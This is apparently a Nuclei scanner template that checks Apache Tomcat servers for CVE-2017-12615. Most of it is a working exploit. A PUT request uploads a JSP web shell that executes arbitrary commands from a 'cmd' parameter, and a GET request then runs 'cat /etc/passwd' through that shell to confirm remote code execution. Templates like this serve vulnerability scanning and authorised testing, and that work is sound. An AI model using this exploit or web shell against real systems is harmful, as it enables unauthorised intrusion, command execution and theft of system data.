id: CVE-2017-12615
info:
  author: pikpikcu
  description: 'By design, you are not allowed to upload JSP files via the PUT method
    on the Apache Tomcat servers.

    This is likely a security measure to prevent an attacker from uploading a JSP
    shell and gaining remote code execution on the server.

    However, due to the insufficient checks, an attacker could gain remote code execution
    on 7.0.{0 to 79}

    Tomcat servers that has enabled PUT by requesting PUT method on the Tomcat server
    using a specially crafted HTTP request.

    '
  name: Apache Tomcat RCE
  reference: https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615
  severity: critical
  tags: cve,cve2017,apache,rce
requests:
- body: "<%@ page import=\"java.util.*,java.io.*\"%>\n<%\nif (request.getParameter(\"\
    cmd\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"\
    cmd\") + \"<BR>\");\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"\
    cmd\"));\n        OutputStream os = p.getOutputStream();\n        InputStream\
    \ in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n\
    \        String disr = dis.readLine();\n        while ( disr != null ) {\n   \
    \             out.println(disr);\n                disr = dis.readLine();\n   \
    \             }\n        }\n%>\n"
  headers:
    Content-Type: application/x-www-form-urlencoded
  method: PUT
  path:
  - '{{BaseURL}}/poc.jsp/'
- matchers:
  - part: body
    regex:
    - root:.*:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/poc.jsp?cmd=cat+%2Fetc%2Fpasswd'
